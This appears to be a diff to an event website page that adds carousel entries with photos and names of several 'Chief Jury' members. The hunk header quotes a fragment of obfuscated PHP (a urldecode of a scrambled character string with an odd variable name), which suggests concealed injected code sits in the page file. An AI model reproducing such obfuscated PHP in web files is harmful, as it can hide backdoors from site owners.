@@ -1746,6 +1746,62 @@ $x_yz_z_yyz=urldecode("%6f%41%2d%62%4e%6e%4b%37%4c%35%5f%4a%55%74%52%78%49%59%2b
 
                         <div class="col-12 col-sm-6 p-4 rounded-3 text-center" style="margin-left: 50%; transform: translate(-50%);">
 
+                            <a href="./images/ashu.png"><img class="rounded-circle img-thumbnail d-block mx-auto" src="./images/ashu.png" alt="" style="max-width: 50%;"></a>
+
+                            <h5 class="mt-4">Ashu Ahuja</h5>
+
+                            <p>Chief Jury</p>
+
+                        </div>
+
+                    </div>
+
+                    <div class="carousel-item" data-bs-interval="2000">
+
+                        <div class="col-12 col-sm-6 p-4 rounded-3 text-center" style="margin-left: 50%; transform: translate(-50%);">
+
+                            <a href="./images/shreya.png"><img class="rounded-circle img-thumbnail d-block mx-auto" src="./images/shreya.png" alt="" style="max-width: 50%;"></a>
+
+                            <h5 class="mt-4">Shreya Singh</h5>
+
+                            <p>Chief Jury</p>
+
+                        </div>
+
+                    </div>
+
+                    <div class="carousel-item" data-bs-interval="2000">
+
+                        <div class="col-12 col-sm-6 p-4 rounded-3 text-center" style="margin-left: 50%; transform: translate(-50%);">
+
+                            <a href="./images/praveena.png"><img class="rounded-circle img-thumbnail d-block mx-auto" src="./images/praveena.png" alt="" style="max-width: 50%;"></a>
+
+                            <h5 class="mt-4">Praveena Salecha</h5>
+
+                            <p>Chief Jury</p>
+
+                        </div>
+
+                    </div>
+
+                    <div class="carousel-item" data-bs-interval="2000">
+
+                        <div class="col-12 col-sm-6 p-4 rounded-3 text-center" style="margin-left: 50%; transform: translate(-50%);">
+
+                            <a href="./images/het.png"><img class="rounded-circle img-thumbnail d-block mx-auto" src="./images/het.png" alt="" style="max-width: 50%;"></a>
+
+                            <h5 class="mt-4">Mr. Het Rathod</h5>
+
+                            <p>Chief Jury</p>
+
+                        </div>
+
+                    </div>
+
+                    <div class="carousel-item" data-bs-interval="2000">
+
+                        <div class="col-12 col-sm-6 p-4 rounded-3 text-center" style="margin-left: 50%; transform: translate(-50%);">
+
                             <a href="./images/Honey_Kashyap.jpeg"><img class="rounded-circle img-thumbnail d-block mx-auto" src="./images/Honey_Kashyap.jpeg" alt="" style="max-width: 50%;"></a>
 
                             <h5 class="mt-4">Mrs. Honey Kashyap</h5>
